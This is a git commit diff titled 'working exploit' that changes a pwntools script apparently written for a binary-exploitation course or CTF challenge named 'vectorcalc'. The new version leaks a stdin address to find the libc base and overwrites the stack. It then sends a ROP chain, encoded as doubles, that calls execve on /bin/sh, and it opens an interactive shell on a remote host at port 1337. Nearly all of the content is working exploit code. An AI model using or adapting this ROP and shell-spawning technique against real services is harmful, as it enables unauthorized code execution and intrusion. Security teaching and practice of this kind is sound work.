0ab0bd088e6879242f039fd1151c90720d9213b9
kscieslinski <kscieslinski@gmail.com>
2019-01-06 19:40:46 +0100

    working exploit

--- BSK/Pwn/exp.py
+++ BSK/Pwn/exp.py
@@ -6,13 +6,10 @@ from pwn import *
 STACK_SIZE = 32
 VECTOR_WIDTH = 8
 
-OFFSET = -1
-
 BUF_ADDR_ID = 1
 VARS_ADDR_ID = 4
+STDIN_ADDR_ID = 5
 RET_ADDR_ID = 7
-
-MAIN_ADDR = -1
 
 # converts hex string '0x956fa79a4dd7cd00' to double string representation '-1.97192842818324546837e-205'
 def payload_to_double(hex_x):
@@ -27,23 +24,6 @@ def double_to_hex(dec_x):
     resp = requests.get(url)
     values = ET.fromstring(resp.content)
     return values[1].text
-
-def find_offset(compute_ret_addr):
-    global OFFSET
-    local_compute_ret_addr = 0x555555555d5b
-    OFFSET = local_compute_ret_addr - compute_ret_addr
-
-def putsplt_addr():
-    local_putsplt_addr = 0x555555555040 # p.elf.symbols['plt.puts'] 
-    return local_putsplt_addr - OFFSET
-
-def putsgot_addr():
-    local_putsgot_addr = 0x555555558020 # p.elf.symbols['got.puts'] 
-    return local_putsgot_addr - OFFSET
-
-def pop_rdi_gadget_addr():
-    local_pop_rdi_gadget_addr = 0x555555555d90
-    return local_pop_rdi_gadget_addr - OFFSET
 
 # converts endianess ex. '0x414243' to '0x43424100' and fill with zeros
 def revert(hex):
@@ -70,13 +50,10 @@ def override_vars_and_buf_addr(p):
         if i == VECTOR_WIDTH - 1:
             hex_addr = hex_addr[:-1]
         payload.append(hex_addr)
-
-    global MAIN_ADDR
-    MAIN_ADDR = payload[RET_ADDR_ID]
-
-    # save address of compute to find OFFSET later    
-    compute_ret_addr = int(double_to_hex(payload[RET_ADDR_ID]), 16)
     
+    # stdin address
+    stdin_addr = int(double_to_hex(payload[STDIN_ADDR_ID]), 16)
+
     # override buf address
     payload[BUF_ADDR_ID] = str(payload_to_double(str(hex(int(double_to_hex(payload[BUF_ADDR_ID]), 16) + 1024))))
     # override vars address
@@ -88,52 +65,50 @@ def override_vars_and_buf_addr(p):
     resp = p.recvline().strip()
     log.info("Received: " + resp)
 
-    return compute_ret_addr
+    return stdin_addr
 
-def find_libc_offset(p, compute_ret_addr):
-    # find puts libc addr
-    pop_rdi_gadzet = payload_to_double(hex(pop_rdi_gadget_addr()))
-    putsgot = payload_to_double(hex(putsgot_addr()))
-    putsplt = payload_to_double(hex(putsplt_addr()))
+def find_libc_base_addr(stdin_addr):
+    libc_elf = ELF('libc.so.6')
+    stdin_offset = libc_elf.symbols['stdin']
+    libc_base_addr = stdin_addr - stdin_offset
+    return libc_base_addr    
 
-    payload = ['0'] * VECTOR_WIDTH 
-    payload[0] = pop_rdi_gadzet
-    payload[1] = putsgot # puts libc addr should be in got
-    payload[2] = putsplt
-    payload[3] = MAIN_ADDR # we want to get back to main
+# mov rax, 0x3b 
+# mov rdi, </bin/sh addr>
+# mov rsi, 0
+# mov rdx, 0
+# syscall
+def set_shell(p, libc_base_addr):
+    payload = [0] * VECTOR_WIDTH
+    payload[0] = g1_pop_rax = 0x000000000003ad30
+    payload[1] = rax_val = 0x3b
+    payload[2] = g2_pop_rdi = 0x0000000000023be3
+    payload[3] = rdi_val = 0x0000000000184519
+    payload[4] = g3_pop_rdx_rsi = 0x0000000000109159
+    payload[5] = rdx_val = 0x0
+    payload[6] = rsi_val = 0x0
+    payload[7] = g5_syscall = 0x0000000000024284
+
+    for i in range(VECTOR_WIDTH):
+        if i not in [1, 5, 6]:
+            payload[i] += libc_base_addr
+        payload[i] = payload_to_double(hex(payload[i]))
     
-    # a={4.63557053866075e-310, 4.6355705390979e-310, 4.63557053849238e-310, -4.63557053865813416291e-310, 0, 0, 0, 0}
     payload = b'a={' + b', '.join(payload) + b'}'
+    
     log.info("Sending: " + payload)
     p.sendline(payload)
-
-    resp = p.recvline(keepends=False).encode('hex')
-    resp = '0x' + resp + '0' * (16 - len(resp))
-    puts_libc = revert(resp)
-    log.info("puts_libc: " + puts_libc)
-
-    libc_elf = ELF('libc.so.6')
-    puts_offset = libc_elf.symbols['puts']
-    libc_base = int(puts_libc, 16) - puts_offset
-    log.info("libc_base: " + hex(libc_base))
-
-    p.sendline(payload)
-    resp = p.recvline(keepends=False).encode('hex')
-    print(resp)
+    p.interactive()
 
 def main():
-    # libc_elf = ELF('libc.so.6')
-    # stdin_offset = libc_elf.symbols['stdin']
-    # print(hex(stdin_offset))
-    # return 
-    p = process('./vectorcalc')
+    p = remote('h4x.0x04.net', 1337)
 
-    compute_ret_addr = override_vars_and_buf_addr(p)
-    
-    find_offset(compute_ret_addr)
-    log.info("Offset: " + str(OFFSET))
+    stdin_addr = override_vars_and_buf_addr(p)
 
-    find_libc_offset(p, compute_ret_addr)
+    libc_base_addr = find_libc_base_addr(stdin_addr)
+    log.info("libc_base_addr " + hex(libc_base_addr))
+
+    set_shell(p, libc_base_addr)
 
     p.wait_for_close()
     print(p.poll())
